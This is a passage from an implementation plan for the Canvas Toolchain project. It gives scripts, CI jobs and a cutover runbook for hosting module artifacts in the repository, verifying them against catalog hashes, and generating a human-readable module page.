  if (sha256(built) !== committedHash) {
    fail(`${id} v${version}: committed artifact is NOT what the source builds.\n  built:     ${sha256(built)}\n  committed: ${committedHash}\nRebuild and recommit the artifact.`);
    continue;
  }

  console.log(`ok: ${id} v${version} — committed == built == catalog (${committedHash.slice(0, 12)}…)`);
}

if (process.exitCode === 1) {
  console.error('\nModule artifact verification failed. The catalog is the trust root; it must never point at bytes nobody can reproduce.');
}
```

- [ ] **Step 3: Wire it up**

Add to the root `package.json` `scripts`:

```json
"verify:modules": "node scripts/verify-module-artifacts.mjs"
```

Add a job to `.github/workflows/ci.yml` (mirroring the existing jobs' `runs-on`/`setup-node` block — Node 20, `cache: npm`):

```yaml
  module-artifacts:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version: 20
          cache: npm
      - run: npm ci
      - run: npm run build
      - name: Verify committed module artifacts match the source and the catalog
        run: npm run verify:modules
```

Delete `.github/workflows/release-module.yml`. Publishing a module version is now a pull request, not a tag.

- [ ] **Step 4: Run it and confirm the pre-cutover state is honest**

Run: `npm run verify:modules`
Expected: FAIL — `announcements v1.1.0: artifactUrl does not match its file location.` The live catalog still points at the old Release asset. **This is correct.** The gate is telling the truth: the catalog cutover has not happened yet, and it lands in the Runbook's step 3 as a separate PR. Confirm the message names the right file and moves on.

- [ ] **Step 5: Commit**

```bash
git add .gitattributes scripts/verify-module-artifacts.mjs package.json .github/workflows/ci.yml
git rm .github/workflows/release-module.yml
git commit -m "ci: rebuild module artifacts from source and verify against the catalog

Replaces per-module GitHub Releases. A committed artifact must equal both its
catalog hash and a fresh build of its source, checked in the PR — a release
asset could never be checked this way, because it only existed once public.

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

Note for the implementer: CI on this PR will fail the new `module-artifacts` job for exactly the reason in Step 4, and that is expected until the Runbook's catalog-cutover PR. Do not "fix" it by weakening the gate. If the reviewer needs the branch green, the correct move is to say so in the PR body and let the merge wait for the cutover — not to loosen the check.

---

### Task 6: Generated module page

**Files:**
- Create: `scripts/generate-module-docs.mjs`
- Modify: `package.json` (root — add `docs:modules`)
- Modify: `.github/workflows/ci.yml` (drift check)
- Modify: `README.md`

**Interfaces:**
- Produces: `npm run docs:modules` writes `docs/modules.md` from `module-catalog.json`.

- [ ] **Step 1: Write the generator**

```js
#!/usr/bin/env node
// docs/modules.md is generated. The human page and the machine catalog are two faces
// of one list; generating one from the other is what keeps them from drifting.
import { readFileSync, writeFileSync } from 'node:fs';

const catalog = JSON.parse(readFileSync('module-catalog.json', 'utf-8'));
const lines = [];

lines.push('<!-- Generated by scripts/generate-module-docs.mjs. Do not edit by hand. -->');
lines.push('<!-- Edit module-catalog.json, then run: npm run docs:modules -->');
lines.push('');
lines.push('# Canvas Toolchain modules');
lines.push('');
lines.push('Canvas Toolchain is one program, released once, on [the Releases page](https://github.com/Ryfter/canvas-toolchain/releases).');
lines.push('The things below are not separate releases — they are optional pieces you can add to it.');
lines.push('');
lines.push('## Modules you can install');
lines.push('');
lines.push('Ask Claude to install one — for example, *"install the announcements module."* It downloads the module,');
lines.push('checks its fingerprint against this catalog, shows you what it is about to do, and only proceeds when you say yes.');
lines.push('You never download a module by hand.');
lines.push('');

if (catalog.modules.length === 0) {
  lines.push('_No installable modules are published yet._');
  lines.push('');
}
for (const m of catalog.modules) {
  lines.push(`### ${m.name}`);
  lines.push('');
  lines.push(m.description);
  lines.push('');
  lines.push(`- **Current version:** ${m.version}`);
  lines.push(`- **Needs Canvas Toolchain:** v${m.minHostVersion} or newer`);
  lines.push(`- **Install with:** \`install_module({ moduleId: "${m.id}" })\` — or just ask Claude for it by name`);
  lines.push('');
}

lines.push('## Companion programs');
lines.push('');
lines.push('These are separate programs. They work alongside Canvas Toolchain, and most work perfectly well on their own.');
lines.push('The toolchain will not install them for you — read what they do and pick them up from their own page if you want them.');
lines.push('');

if ((catalog.companions ?? []).length === 0) {
  lines.push('_No companion programs are listed yet._');
  lines.push('');
}
for (const c of catalog.companions ?? []) {
  lines.push(`### ${c.name}`);
  lines.push('');
  lines.push(c.summary);
  lines.push('');
  lines.push(`**Why you'd want it:** ${c.whyYouWantIt}`);
  lines.push('');
  if (c.worksWithoutToolchain) lines.push('Works on its own, without Canvas Toolchain.');
  lines.push('');
  lines.push(`[Get ${c.name}](${c.url})`);
  lines.push('');
}

writeFileSync('docs/modules.md', lines.join('\n'), 'utf-8');
console.log('wrote docs/modules.md');
```

- [ ] **Step 2: Generate the page and commit the result**

Run: `npm run docs:modules` (after adding `"docs:modules": "node scripts/generate-module-docs.mjs"` to the root `package.json` scripts).
Expected: writes `docs/modules.md`. Read it and confirm it reads like something you'd hand a professor — the current catalog has one module and no companions, so the companion section will say so.

- [ ] **Step 3: Add the CI drift check**

Add to the `module-artifacts` job in `.github/workflows/ci.yml`, after the `verify:modules` step:

```yaml
      - name: Verify docs/modules.md is regenerated from the catalog
        run: |
          npm run docs:modules
          git diff --exit-code docs/modules.md
```

- [ ] **Step 4: Link it from the README**

In `README.md`, under the section that describes what the toolchain includes, add:

```markdown
**Optional modules and companion programs:** see [docs/modules.md](docs/modules.md).
```

- [ ] **Step 5: Commit**

```bash
git add scripts/generate-module-docs.mjs docs/modules.md package.json .github/workflows/ci.yml README.md
git commit -m "docs: generate docs/modules.md from the catalog

One list, two faces — the human page and the machine catalog cannot drift,
because CI regenerates the page and fails on any difference.

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 7: Rewrite the publish runbook and the agent handoffs

**Files:**
- Modify: `docs/module-channel.md`
- Modify: `AGENTS.md`
- Modify: `docs/roadmap.md`

- [ ] **Step 1: Rewrite `docs/module-channel.md`**

Replace the tag-and-release publish runbook with the pull-request flow. The section must contain, in this order:

1. **Trust model** (carry over unchanged from the existing §5): the catalog on `main` is the trust root; sha256 pins the bytes; install re-verifies; the loader re-hashes before every dynamic import; nothing auto-installs.
2. **Publishing a module version:**
   ```bash
   # 1. Bump the module's package.json version and src/index.ts version to match.
   # 2. Build the artifact.
   npm run build:module -- announcements     # prints {"sha256": "...", "sizeBytes": N}

   # 3. Commit it at its versioned path (never overwrite an existing version directory).
   mkdir -p modules/announcements/1.1.1
   cp dist-channel/module-announcements-1.1.1.mjs modules/announcements/1.1.1/announcements-1.1.1.mjs

   # 4. Update module-catalog.json: version, artifactUrl, sha256, sizeBytes.
   # 5. Regenerate the human page.
   npm run docs:modules

   # 6. Prove it locally before you push.
   npm run verify:modules

   # 7. Open a PR. CI reruns verify:modules and the docs-drift check.
   ```
3. **Why there is no module release:** a GitHub Release is an announcement, not a file host. Using one put a module on the product's front page, took the "Latest" badge, and silently killed the update check that read it. The Releases page is Canvas Toolchain and nothing else.
4. **Adding a companion:** one entry in `companions[]` (`id`, `name`, `summary`, `whyYouWantIt`, `url`, `worksWithoutToolchain`) and `npm run docs:modules`. **Never** a command, script, or anything runnable — validation is default-deny and will refuse it.

- [ ] **Step 2: Update `AGENTS.md`**

In the module-channel section, replace any description of per-module release tags with: artifacts live at `modules/<id>/<version>/<id>-<version>.mjs` on `main`; `module-catalog.json` is `catalogVersion: 2` and carries `modules[]` and `companions[]`; publishing is a PR, gated by `npm run verify:modules`; the only release tags that exist are `vX.Y.Z`.

- [ ] **Step 3: Update `docs/roadmap.md`**

Add a v2.1.0 entry: one release surface, repo-hosted module artifacts, companion entries, hardened update check, generated module page. Note the compat break: v2.0.x installs cannot read a `catalogVersion: 2` catalog and must update.

- [ ] **Step 4: Commit**

```bash
git add docs/module-channel.md AGENTS.md docs/roadmap.md
git commit -m "docs: module publishing is a pull request, not a release

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

## Runbook — the cutover (after the PR merges)

**Order is load-bearing.** Do not reorder to save a step.

- [ ] **1. Merge the Tasks 1–7 PR to `main`.** The catalog is still v1 and still points at the old Release asset. No installed toolchain is affected — professors run released installers, not `main`.

- [ ] **2. Cut the v2.1.0 release.** Run the existing `release-installer` workflow for tag `v2.1.0` and confirm all four assets attach.

  This is the moment the update nudge comes back to life: `v2.1.0` takes GitHub's "Latest" badge by recency, so every professor on v1.x — who has been told nothing since the module tag landed, including about the v2.0.1 security release — is finally prompted.

- [ ] **3. Immediately after, open and merge the catalog-cutover PR.** This one changes catalog content only:
  - `modules/announcements/1.1.0/announcements-1.1.0.mjs` — the artifact. Take the **exact bytes already published** (`gh release download module-announcements-v1.1.0`); do not rebuild. It must hash to `821aae56e774b10c4ce643ca358052264e52d0db9491e8692370a461bb0aae35`. Same bytes, new address: **no module version bump is needed.**
  - `module-catalog.json` — `catalogVersion: 2`, the module's `artifactUrl` re-pointed at the raw path, `minHostVersion: "2.1.0"`, and the `canvas-backup` companion entry.
  - `docs/modules.md` — regenerated (`npm run docs:modules`).
  - CI's `module-artifacts` job must go green here. If it doesn't, **stop** — the artifact is not reproducible and the catalog would be pinning bytes nobody can rebuild.

  **There is a window between steps 2 and 3** in which a v2.1.0 host would refuse the still-old catalog on `main` (it fails the new host allowlist). Keep it to minutes by having this PR ready to merge before cutting the release. Already-installed modules are unaffected either way — they load from disk against their locally recorded hash and never touch the network.

- [ ] **4. Delete the module releases and their tags.**

  ```bash
  gh release delete module-announcements-v1.1.0 --yes --cleanup-tag
  gh release delete module-announcements-v1.0.0 --yes --cleanup-tag
  gh release list --limit 5     # expect: v2.1.0 (Latest), v2.0.0, v1.11.1, …
  ```

  Version history is not lost: it lives in `modules/` and in git.

- [ ] **5. Verify against the live catalog, end to end.** Not optional, and not satisfiable by the test suite.

  On a clean CC_HOME with a v2.1.0 host, run the real install engine against the real catalog on `main`: `browse_module_catalog` lists Announcements and the Canvas Backup companion; `install_module({ moduleId: 'announcements' })` previews; `confirm: true` downloads from `raw.githubusercontent.com`, verifies `821aae56…`, and places the artifact; the module loads on restart.

  **Why this step exists:** v2.0 shipped a redirect allowlist that refused *every* install for a full day. It was CI-green and review-approved. The unit test passed because its fake fetch redirected to the host I had assumed GitHub used, rather than the one GitHub actually uses. A mocked fixture proves an assumption, not the world. The only thing that catches that class of error is running the real engine against the real thing.

- [ ] **6. Confirm the update nudge is alive.** With an installed version of `2.0.1`, `checkForUpdates()` must produce a notice naming `v2.1.0`. That notice being dead is the defect that started all of this; confirm it out loud rather than assuming.

---

## Self-review

**Spec coverage:** §1 artifact hosting → Tasks 2, 5 + Runbook 3. §1 reproducibility gate → Task 5. §2 update-check hardening → Task 1. §3 two entry kinds → Task 2; `browse_module_catalog` → Task 3. §4 startup notices → Task 4 (app-update, module-update, and pending notices already exist and are unchanged; only the discovery notice is new). §5 human page → Task 6. §6 deletions → Task 5 (workflow), Runbook 4 (releases), Task 7 (runbook rewrite). §7 compat break → Runbook 2–3 ordering + `docs/roadmap.md` in Task 7. §8 sequencing → Runbook. §9 testing → Tasks 1–6.

**Type consistency:** `ModuleCatalog.companions` is a required `CompanionEntry[]` (Task 2), consumed by `browseModuleCatalog` (Task 3), the generator (Task 6), and the notice (Task 4, which reads `.modules` only). `parseToolchainTag` (Task 1) is used only inside `check.ts`. `loadNoticeState`/`saveNoticeState`/`noticeStatePath` (Task 4) are used only by `notices.ts`. The artifact path `modules/<id>/<version>/<id>-<version>.mjs` and the `artifactUrl` it implies are constructed identically in the validator prefix (Task 2), the verifier (Task 5), the generator's implied links (Task 6), and the runbook.

**Known-red gate:** Task 5's CI job is red on the Tasks 1–7 PR by design, and green only after the Runbook's catalog cutover. This is written into the task so no implementer "fixes" it by weakening the check.
